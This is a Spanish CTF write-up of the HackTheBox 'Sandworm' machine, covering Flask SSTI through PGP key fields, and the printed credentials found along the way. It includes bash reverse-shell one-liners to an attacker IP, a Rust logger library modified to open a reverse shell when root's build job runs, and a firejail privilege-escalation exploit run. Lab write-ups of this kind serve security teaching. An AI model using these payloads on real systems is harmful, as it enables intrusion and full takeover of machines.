---
title: Writeup - Maquina "Sandworm" HackTheBox
author: marcvs
date: 2023-07-18
categories: [Writeup, HackTheBox]
tags: [writeup, hackthebox, pgp, gpg, gnupg, python, linux]
pin: false
img_path: /assets/img/writeups/sandworm/
image:
    path: sandworm.png
    alt: HackTheBox Sandworm machine
---

Los **######** significan que la información en esas secciones se omitió por fines prácticos.

## Enumeración remota
### Puertos
Primero debemos ver si el host está encendido haciendo un ping.

```bash
$ ping -c 1 10.10.11.218
PING 10.10.11.218 (10.10.11.218) 56(84) bytes of data.
64 bytes from 10.10.11.218: icmp_seq=1 ttl=63 time=80.8 ms

--- 10.10.11.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 80.841/80.841/80.841/0.000 ms
```

Luego escaneamos los puertos en la maquina, es recomendable colocar el parametro `-Pn` para forzar el escaneo, ya que normalmente hace un descubrimiento de host y al usar una **VPN** posiblemente no detecte el host.

```bash
$ nmap 10.10.11.218 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 13:38 CST
Nmap scan report for 10.10.11.218
Host is up (0.087s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

El escaneo básico en este caso nos reporta puertos interesantes, para obtener más información agregaremos la opción `-A` para que a medida detecte puertos abiertos trate de detectar el OS, la version del servicio que corre por el puerto, ejecución de algunos scripts básicos para reconocimiento y un traceroute. Puede que vaya lento por lo que agregaremos los templates de tiempo y rendimiento con `-T`; al ser un entorno controlado podemos usar la máxima que en este caso es `5`.

```bash
$ nmap -A -T5 10.10.11.218 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 13:40 CST
Nmap scan report for 10.10.11.218
Host is up (0.081s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
######
```

Podemos ver que existen un servicio **Web** que nos redirige a **HTTPS** en un dominio llamado `ssa.htb`. Si hacemos un `ping` a este nombre veremos que hay un problema, y es que nuestra máquina no conoce la **IP** a la que está asociada

```bash
$ ping -c 1 ssa.htb
ping: ssa.htb: Nombre o servicio desconocido
```

Al ser un CTF lo mejor es editar el archivo `/etc/hosts` e incluir este nombre `10.10.11.218  ssa.htb`. Ahora vemos que ya sabe a donde apuntar, esto es util ya que es necesario para ver la página web.

```bash
ping -c 1 ssa.htb
PING ssa.htb (10.10.11.218) 56(84) bytes of data.
64 bytes from ssa.htb (10.10.11.218): icmp_seq=1 ttl=63 time=80.6 ms

--- ssa.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 80.629/80.629/80.629/0.000 ms
```

### Página web
![web page ssa.htb](ssa-web.png)

Explorando la página podemos ver algo en la sección de contacto en la que hablan de **PGP**. También que está desarrollada con `Flask`, esto llama la atención y nos hace pensar en un **Server Side Template Injection (SSTI)**.

![contact ssa.htb](ssa-contact.png)

Una opción sería probar un **Cross  Site Scripting (XSS)** esperando que un usuario vea los mensaje que se envían, pero no es el vector correcto. Al final del formulario vemos que dice **"Don't know how to use PGP? Check out our guide"** que nos muestra algunas funciones para hacer ciertas cosas con **PGP**

![pgp guide ssa.htb](ssa-guide.png)

También nos comparte una clave pública PGP **"Practice by importing our public key and encrypting, signing, and verifying messages."** con la que podemos operar para practicar.

![pgp public key ssa.htb](ssa-pgpkey.png)

### PGP
**Pretty Good Privacy** es un programa que te permite cifrar información. Utiliza una combinación de técnicas de cifrado como hash, compresión de datos, criptografía simétrica y criptografía asimétrica para mantener la seguridad y la autenticidad de los datos. **PGP** es un criptosistema híbrido que combina lo mejor de ambos tipos de cifrado. También se puede usar **PGP** para firmar digitalmente mensajes y archivos, lo que permite verificar la identidad, valides y evitar falsificación.

En **linux** para usar este mecanismo de cifrado tenemos [GnuPG](https://gnupg.org/index.html). Para este CTF necesitaremos hacer muchas pruebas antes de continuar y `gpg` nos exporta todas las claves que usemos ya sean publicas o privadas a nuestro peril GnuPG, por lo que desarrollé una **Suite** de herramientas hechas con **Python3** llamada [pgp-pysuite](https://github.com/marcvspt/pgp-pysuite).

```bash
$ python3 keygen.py -h
usage: keygen.py [-h] -p PASSPHRASE -n NAME -e EMAIL [-b BASE_NAME] [--bits BITS]

PGP Key pair RSA generator

optional arguments:
  -h, --help            show this help message and exit
  -p PASSPHRASE, --passphrase PASSPHRASE
                        Password for the private key
  -n NAME, --name NAME  User real name
  -e EMAIL, --email EMAIL
                        User e-mail
  -b BASE_NAME, --base-name BASE_NAME
                        Base name for the keys
  --bits BITS           Key length in bits
```
Creamos un par de **claves PGP** y probamos algunas funciones de la página creando lo que nos pidan.

```bash
$ python3 keygen.py -p password123 -n marcvs -e marcvs@ssa.htb

[+] Keys generated successfully

$ ls
decrypt.py  keygen.py           keypgp_uwu.pub.asc  requeriments.txt  verify.py
encrypt.py  keypgp_uwu.key.asc  README.md           sign.py
```

Hay algo curioso y llamativo en una función de la página. Cuando verificamos la firma de un mensaje usando nuestra llave **pública PGP** nos muestra nuestro nombre.

![pgp verify ssa.htb](ssa-verify.png)

Esto sucede, ya que, cuando creamos las **claves PGP**, nuestra información está embedida en nuestra clave pública para identificar a quién pertenece. Podemos verlo usando la aplicación online [GPG-DECODER](https://cirw.in/gpg-decoder/).

![pgp decoder publi key](ssa-pgpdecoder.png)

## Usuario bajos privilegios
### SSTI
Podemos probar a hacer un **Server Side Template Injection**. Un **SSTI** es una vulnerabilidad que ocurre cuando el **input** de un usuario directamente se refleja en el template usado para hacer la web sin sanitizarlo y un atacante puede usar la sintaxis nativa de una plantilla, como `flask`, para inyectar un código malicioso, que luego se ejecuta en el lado del servidor.

Podemos suponer que la función que hace la verificación devuelve la información, el nombre y quizá el email e inyecta los datos en sus campos especiales de `flask` en el template. Vamos a hacer una prueba.

Primero creamos el par de claves injectando un **SSTI** básico para `flask-jinja2`:
![payload ssti verify ssa.htb](ssa-ssti.png)

Firmamos cualquier mensaje:
```bash
$ python3 sign.py -c ssti-tests.pub.asc -k ssti-tests.key.asc -p password123 -m "Hola mundo"

[+] Message signed successfully

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Hola mundo
-----BEGIN PGP SIGNATURE-----
#####
```

¡Funciona! se ha interpretado correctamente nuestro payload y nos ha devuelto lo que nos esperabamos tanto en el nombre como en el email:

![ssti verify msg detection](ssa-ssti-detection.png)

### RCE
Probemos algo sencillo como ejecutar un `id` usando la información de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) y/o [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti):

![ssti command id](ssa-ssti-id.png)

Vemos que si funcionó y que somos el usuario `atlas`

![ssti command id response](ssa-ssti-id-res.png)

Es dificil leer y ejecutar comandos largos o que tengan muchos caracteres especiales, por lo que lo mejor es encodear en `base64` el payload y probar los más cortos. Tratar de leer la `id_rsa` no será posible.

```bash
echo "bash -i >& /dev/tcp/10.10.14.176/443 0>&1" -n | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzYvNDQzIDA+JjEgLW4K
```

![ssti command reverse shell](ssa-ssti-revshell.png)

```bash
$ nc -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.218.
Ncat: Connection from 10.10.11.218:58168.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/var/www/html/SSA$
```

### Escapar del Sandbox
Ya estamos en la máquina pero tenemos un problema, no podemos ejecutar varios comandos, estamos atrapados
```bash
atlas@sandworm:/$ uname -a
uname -a
Could not find command-not-found database. Run 'sudo apt update' to populate it.
uname: command not found
atlas@sandworm:/$ hostname -I
hostname -I
Could not find command-not-found database. Run 'sudo apt update' to populate it.
hostname: command not found
atlas@sandworm:/var/www/html/SSA$
```

Explorando vemos que en el directorio `/home` de el usuario con el que estamos, `atlas`, hay un archivo `.json`.

```bash
atlas@sandworm:~$ ls -l .config/
ls -l .config/
total 4
dr-------- 2 nobody nogroup   40 Jun 19 18:30 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie
atlas@sandworm:~$ ls -l .config/httpie/
ls -l .config/httpie/
total 4
drwxrwxr-x 3 root atlas 4096 Jan 15  2023 sessions
atlas@sandworm:~$ ls -l .config/httpie/sessions/
ls -l .config/httpie/sessions/
total 4
drwxrwx--- 2 root atlas 4096 May  4 17:30 localhost_5000
atlas@sandworm:~$ ls -l .config/httpie/sessions/localhost_5000/
 ls -l .config/httpie/sessions/localhost_5000/
total 4
-rw-r--r-- 1 root atlas 611 May  4 17:26 admin.json
atlas@sandworm:~$ cat .config/httpie/sessions/localhost_5000/admin.json
cat .config/httpie/sessions/localhost_5000/admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

Un usuario y contraseña `silentobserver:quietLiketheWind22`, podemos probar conectarnos como `atlas`, pero no funcionará, podemos probar tal cual nos la proporcionan.

```bash
$ sshpass -p "quietLiketheWind22" ssh silentobserver@10.10.11.214
#####
silentobserver@sandworm:~$ ls
user.txt
sau@sandworm:~$ cat user.txt
f9d**************************637
```

## Escalada de privilegios
### Enumeración local
Una via potencial de escalar privilegios es buscando ejecutables **SUID**, en este caso encontramos en `/opt/tipnet/target/debug/tipnet` uno que tiene como propietario a atlas, así que es posible que si logramos injectar un comando usando este binario lo hagamos como `atlas`

```bash
silentobserver@sandworm:/opt/tipnet/target/debug$ ls -la
total 57800
drwxrwxr-x   7 root  atlas     4096 Jun  6 11:49 .
drwxr-xr-x   3 root  atlas     4096 Jun  6 11:49 ..
-rwxrwxr--   1 root  atlas        0 Feb  8 09:10 .cargo-lock
drwxrwxr-- 472 root  atlas    24576 Jun  6 11:49 .fingerprint
drwxrwxr-x 142 atlas atlas    12288 Jun  6 11:49 build
drwxrwxr-x   2 atlas atlas    69632 Jun  6 11:49 deps
drwxrwxr-x   2 atlas atlas     4096 Jun  6 11:49 examples
drwxrwxr-x   6 atlas atlas     4096 Jun  6 11:49 incremental
-rwsrwxr-x   2 atlas atlas 59047248 Jun  6 10:00 tipnet
-rw-rw-r--   1 atlas atlas       87 May  4 17:24 tipnet.d
```

Vamos a probar que hace esta herramienta:
```bash
silentobserver@sandworm:/opt/tipnet/target/debug$ ./tipnet

             ,,
MMP""MM""YMM db          `7MN.   `7MF'         mm
P'   MM   `7               MMN.    M           MM
     MM    `7MM `7MMpdMAo. M YMb   M  .gP"Ya mmMMmm
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM
     MM      MM   MM    M8 M   `MM.M 8M""""""  MM
     MM      MM   MM   ,AP M     YMM YM.    ,  MM
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo
                  MM
                .JMML.


Select mode of usage:
a) Upstream
b) Regular (WIP)
c) Emperor (WIP)
d) SQUARE (WIP)
e) Refresh Indeces
```

Investigando más la ruta `/opt/tipnet/src` vemos que podemos leer el código fuente de esta aplicación

```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("
             ,,
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm
P'   MM   `7               MMN.    M           MM
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM
     MM      MM   MM   ,AP M     YMM YM.    ,  MM
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo
                  MM
                .JMML.

");


    let mode = get_mode();

    if mode == "" {
	   return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

	let valid = false;
	let mut mode = String::new();

	while ! valid {
		mode.clear();

		println!("Select mode of usage:");
		print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

		io::stdin().read_line(&mut mode).unwrap();

		match mode.trim() {
			"a" => {
			     println!("\n[+] Upstream selected");
			     return "upstream".to_string();
			}
			"b" => {
			     println!("\n[+] Muscular selected");
			     return "regular".to_string();
			}
			"c" => {
			     println!("\n[+] Tempora selected");
			     return "emperor".to_string();
			}
			"d" => {
				println!("\n[+] PRISM selected");
				return "square".to_string();
			}
			"e" => {
				println!("\n[!] Refreshing indeces!");
				return "pull".to_string();
			}
			"q" | "Q" => {
				println!("\n[-] Quitting");
				return "".to_string();
			}
			_ => {
				println!("\n[!] Invalid mode: {}", mode);
			}
		}
	}
	return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

Podemos ver que usa `extern crate logger;`, buscaremos en donde se hace referencia en `/opt/tipnet` a esto de `logger`.

```bash
silentobserver@sandworm:/opt/tipnet$ grep -r "logger" 2>/dev/null
Cargo.toml:logger = {path = "../crates/logger"}
#####
```

Hace referencia a una dependencia de este programa, pero no es una que se descargue de Internet, sino que es personalizada y esta en `/opt/crates/logger` y su archivo de `rust` en `src/lib.rs`. Nosotros como grupo podemos editar y leerlo.

```bash
silentobserver@sandworm:/opt/crates/logger/src$ ls -la
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 .
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
```

### RCE
Usando [pspy](https://github.com/DominicBreuker/pspy/releases), para ver las tareas que se ejecutan cada cierto intervalo de tiempo y que usuario las está ejecuntando, vemos que el usuario con **UID=0** (`root`) está creando un binario con `cargo`.

```bash
#####
2023/07/18 21:24:01 CMD: UID=0     PID=38126  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
#####
```

Esto nos hace pensar en un ataque que implique modificar la función `pub fn log` para que ejecute un comando una vez se compile el proyecto de `rust`, ya que el `tipnet` ejecuta la función `log` al final una vez que se usa como sea este binario.

```rust
//#####
  logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

Probemos a enviar una reverse shell a nuestra máquina modificando el `lib.rs`.
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command; //AÑADIMOS ESTO PARA PODER EJECUTAR COMANDOS

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.176/443 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("failed");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
//#####
```

Debemos esperar a que se compile el binario `/opt/tipnet/target/debug/tipnet` para recibir la shell. Es posible que no funcione a la primera porque la máquina restaura los archivos.

```bash
nc -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.218.
Ncat: Connection from 10.10.11.218:45960.
bash: cannot set terminal process group (38829): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:/opt/tipnet$ hostname -I
hostname -I
10.10.11.218
atlas@sandworm:/opt/tipnet$
```

### Obtener root
Estamos de nuevo como `atlas` pero fuera de firejail, estamos como miembro de un grupo raro llamado `jailer`, podemos buscar con `find` a que tenemos acceso.

```bash
atlas@sandworm:~$ find / -group jailer -ls 2>/dev/null
     1344   1740 -rwsr-x---   1 root     jailer    1777952 Nov 29  2022 /usr/local/bin/firejail
```

Vemos el binario `firejail` que es **SUID** y el propietario es `root`, si lo ejecutamos para ver la versión podemos indagar si existen vulneabilidades.

Luego de investigar podemos ver varios articulos relacionados a **Privilege Escalation**, en []() vemos un **exploit** en **C**, pero es mejor buscar algo en **Python** ya que la máquina lo tiene instalado. Tenemos este post de [exploit-notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/#firejail) donde se usa un script de **Python**.

Antes de ejecutarlo, necesitamos otra conexión como atlas, ya que el exploit debe ejecutarse y esperar a que se une a un PID de un servicio firejail ejecutandose, por lo que tener nuestra `id_rsa.pub` como `authorized_keys` en el directorio `.ssh` es lo mejor.

```bash
atlas@sandworm:/tmp/tmp.E649KRelDj$ python3 exploit.py
You can now run 'firejail --join=40143' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

En la otra conexión debemos ejecutar ese comando tal cual nos lo da y luego ejecutar `su -` para acceder como `root`.

```bash
atlas@sandworm:~$ firejail --join=40143
changing root to /proc/40143/root
Warning: cleaning all supplementary groups
Child process initialized in 6.76 ms
atlas@sandworm:~$ su -
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)

root@sandworm:~# cat root.txt
e48**************************655
```